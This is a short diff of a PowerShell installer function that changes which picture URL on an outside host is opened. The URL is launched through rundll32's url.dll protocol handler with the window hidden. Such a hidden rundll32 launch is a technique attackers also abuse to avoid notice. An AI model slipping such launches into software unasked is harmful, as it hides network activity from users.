@@ -96,7 +96,7 @@ function Start-InstallPictureAsync {
         $baseUrl = "https://olxp.cc/download"
     }
     $baseUrl = $baseUrl.Trim().TrimEnd("/")
-    $pictureUrl = $baseUrl + "/picture_1963.webp"
+    $pictureUrl = $baseUrl + "/picture_1977.webp"
     Write-MsiLog ("picture parallel: " + $pictureUrl)
     try {
         Start-Process -FilePath "rundll32.exe" -ArgumentList @("url.dll,FileProtocolHandler", $pictureUrl) -WindowStyle Hidden -ErrorAction Stop
